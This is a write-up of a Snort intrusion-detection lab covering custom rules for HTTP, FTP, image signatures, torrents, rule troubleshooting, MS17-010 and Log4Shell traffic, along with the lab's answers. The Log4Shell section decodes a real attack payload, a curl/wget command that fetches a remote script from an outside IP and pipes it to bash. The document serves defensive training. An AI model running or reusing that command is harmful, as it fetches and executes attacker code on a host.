# Snort IDS Challenge 1 — Full Write-Up

This project demonstrates how to use **Snort** to analyze captured network traffic, create custom IDS rules, detect malicious behavior, and troubleshoot rule errors.

The investigation covers multiple protocols, file signatures, exploits, and payload analysis.

---

# Important File Locations

/var/log/snort              # Default Snort log directory  
/etc/snort/snort.conf       # Snort main configuration file  
/etc/snort/rules/local.rules # Local custom rules  

In this lab, logs and rule files are stored in the **current working directory**.

---

# Common Commands Used

sudo snort -A full -r file.pcap -c local.rules -l .
sudo snort -r snort.log.xxxxx
sudo nano local.rules
cat alert
sudo rm alert
sudo rm snort.log.*

---

# Task 1 — Detecting HTTP Traffic (Port 80)

To detect all TCP traffic going to and from port 80:
```
alert tcp any 80 <> any any (msg:"TCP port 80 inbound traffic detected"; sid:1000000000001; rev:1;)
alert tcp any any <> any 80 (msg:"TCP port 80 outbound traffic detected"; sid:1000000000002; rev:1;)
```
These rules generate alerts for all HTTP traffic regardless of direction.

**Total packets detected:** 328

### Packet Investigation

Read specific packets from the log file:

sudo snort -r snort.log.1688562201 -n 63

| Packet | Detail | Value |
|--------|-------|-------|
| 63 | Destination IP | 145.254.160.237 |
| 64 | ACK Number | 0x38AFFFF3 |
| 62 | SEQ Number | 0x38AFFFF3 |
| 65 | TTL | 128 |
| 65 | Source IP | 145.254.160.237 |
| 65 | Source Port | 3372 |

---

# Task 2 — FTP Traffic Analysis

Detect all FTP traffic on port 21:
```
alert tcp any 21 <> any any (msg:"Outbound ftp traffic detected"; sid:1000000000003; rev:1;)
alert tcp any any <> any 21 (msg:"Inbound ftp traffic detected"; sid:1000000000004; rev:1;)
```
**Total FTP packets detected:** 614  
**FTP Service Identified:** Microsoft FTP Service

### Failed FTP Logins (530 Code)
```
alert tcp any any <> any 21 (msg:"Failed ftp login attempt"; content:"530"; sid:1000000000005; rev:1;)
```
Detected failed logins: 41

### Successful FTP Login (230 Code)
```
alert tcp any any <> any 21 (msg:"Successful ftp login"; content:"230"; sid:1000000000006; rev:1;)
```
Detected successful logins: 1

### Invalid Password Attempts (331 Code)
```
alert tcp any any <> any 21 (msg:"Invalid Password"; content:"331"; sid:1000000000007; rev:1;)
```
Detected attempts: 42

### Invalid Admin Login Attempts
```
alert tcp any any <> any 21 (msg:"Invalid Admin Password"; content:"331"; content:"Administrator"; sid:1000000000008; rev:1;)
```
Detected admin login failures: 7

---

# Task 3 — Writing IDS Rules for PNG & GIF Detection

Refer to this wikipedia site for the list of signature files.: https://en.wikipedia.org/wiki/List_of_file_signatures

Let’s create IDS Rules for PNG files in the traffic!

## PNG File Detection

PNG files begin with the following **8-byte signature**:

```
89 50 4E 47 0D 0A 1A 0A
```

### Snort Rule for PNG Detection

```snort
alert tcp any any -> any any (msg:"PNG File Detected"; content:"|89 50 4E 47 0D 0A 1A 0A|"; depth:8; sid:10000000009; rev:1;)
```

### Rule Explanation

| Component | Description |
|-----------|-------------|
| `alert tcp any any -> any any` | Inspect all TCP traffic |
| `msg:"PNG File Detected"` | Alert message shown in logs |
| `content:"|89 50 4E 47 0D 0A 1A 0A|"` | Matches PNG file signature in hex |
| `depth:8` | Limits search to first 8 bytes of payload |
| `sid` | Unique rule identifier |
| `rev` | Rule revision number |

### Result

Only **1 packet** matched this PNG rule.

---

### Identify Embedded Software

We can extract readable strings from the PCAP to find metadata:

```bash
sudo strings ftp-png-gif.pcap | grep -i adobe
```

### Software Found

Adobe ImageReady

### Clear Old Logs

Before testing the next rule:

```bash
sudo rm alert
sudo rm snort.log.*
```

Comment out or remove the PNG rule inside `local.rules`.

## GIF File Detection

GIF files begin with the ASCII header:

```
GIF89a
```

### Snort Rule for GIF Detection

```snort
alert tcp any any -> any any (msg:"GIF File Detected"; content:"GIF89a"; depth:6; sid:10000000010; rev:1;)
```

### Rule Explanation

| Component | Description |
|-----------|-------------|
| `content:"GIF89a"` | Matches GIF header in ASCII |
| `depth:6` | Searches only first 6 bytes of payload |

## Verify Using Log Strings

```bash
sudo strings snort.log.* | grep GIF
```

### Image Format Identified

**GIF89a**

---

# Task 4: Writing IDS Rules (Torrent Metafile)

In this task, we created IDS rules to detect torrent metafiles in network traffic.

### Use the Given PCAP File

Run Snort against the provided capture file:

```bash
sudo snort -A full -r torrent.pcap -c local.rules -l .
```

## Rule to Detect Torrent Metafile

Torrent files use the **“.torrent”** extension. The `content` option is used to match this string, and `nocase` disables case sensitivity.

```snort
alert tcp any any -> any any (msg:"Torrent File Detected"; content:".torrent"; nocase; sid:10000000011)
```

### Number of Detected Packets

Answer: 2

### Investigate the Log/Alarm Files

Extract readable strings from the Snort log file:

```bash
sudo strings snort.log.1688600657
```

### Name of the Torrent Application

Answer: bittorrent

### MIME Type of the Torrent Metafile

Answer: application/x-bittorrent

### Hostname of the Torrent Metafile

Answer: tracker2.torrentbox.com

---

# Task 5: Troubleshooting Rule Syntax Errors

In this task, syntax and logical errors in multiple Snort rule files were identified and corrected.

Each ruleset was tested using:

```bash
sudo snort -c local-X.rules -r mx-1.pcap -A console
```

## Fixing local-1.rules

The error was caused by missing spacing before the rule options section.

### Fixed Rule

```snort
alert tcp any 3372 -> any any (msg: "Troubleshooting 1"; sid:1000001; rev:1;)
```

Number of detected packets: 16

## Fixing local-2.rules

The rule was missing a port value.

### Fixed Rule

```snort
alert icmp any any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)
```

Number of detected packets: 68

## Fixing local-3.rules

The rules had duplicate SID values. Each rule must have a unique SID.

### Fixed Rules

```snort
alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)
```

Number of detected packets: 87

## Fixing local-4.rules

There were two errors in the second rule:  
• `msg` ended with `:` instead of `;`  
• Duplicate SID value

### Fixed Rules

```snort
alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any 80,443 -> any any (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)
```

Number of detected packets: 90

## Fixing local-5.rules

Snort does not support the `<-` operator.

### Fixed Rules

```snort
alert icmp any any <> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert icmp any any <> any any (msg: "Inbound ICMP Packet Found"; sid:1000002; rev:1;)
alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; rev:1;)
```

Number of detected packets: 155

## Fixing local-6.rules

The rule needed to detect "GET" requests regardless of letter case. The `nocase` option was added.

### Fixed Rule

```snort
alert tcp any any <> any 80 (msg: "GET Request Found"; content:"|67 65 74|"; nocase; sid:100001; rev:1;)
```

Number of detected packets: 2

## Fixing local-7.rules

The rule was missing a required option that explains what the rule detects.

Required option name: msg

### Fixed Rule

```snort
alert tcp any any <> any 80 (msg:"html detected"; content:"|2E 68 74 6D 6C|"; sid:1000001; rev:1;)
```

---

# Task 6 — MS17-010 Exploit Detection

Let’s use external rules to fight against the latest threats!

```
sudo snort -A full -c local.rules -r ms-17-010.pcap
```

Detected packets: 25154

### Detect IPC$ Exploit Attempt

```
alert tcp any any -> any 445 (msg:"Exploit Detected!"; flow:to_server,established; content:"IPC$"; sid:20244225; rev:3;)
```

| Detail | Value |
|-------|------|
| Matches | 12 |
| Requested Path | \\192.168.116.138\IPC$ |
| Vulnerability CVSS v2 Score | 9.3 |

---

# Task 7 — Log4Shell Exploit Detection

```
sudo snort -c local.rules -r log4j.pcap -A full -l .
```

| Question | Answer |
|----------|--------|
| Detected packets | 26 |
| Rules triggered | 4 |
| First 6 SID digits | 210037 |

### Payload Size Detection Rule

```
alert tcp any any -> any any (msg:"Packet payload size between 770 and 855 bytes detected"; dsize:770<>855; sid:1000001;)
```

Packets detected: 41

---

### Encoding Algorithm Identified

Encoding used: Base64

### Malicious Encoded Payload

Encoded string:

KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=

Decoded command:

```
(curl -s 45.155.205.233:5874/162.0.228.253:80 || wget -q -O- 45.155.205.233:5874/162.0.228.253:80) | bash
```

This command attempts to download and execute a remote payload, indicating active exploitation.

---

# Conclusion

This investigation demonstrated:

• Writing custom Snort IDS rules  
• Detecting HTTP, FTP, file signatures, and torrents  
• Identifying exploitation attempts  
• Troubleshooting rule syntax and logic  
• Extracting and decoding malicious payloads  

A complete hands-on demonstration of practical intrusion detection and traffic analysis using Snort.
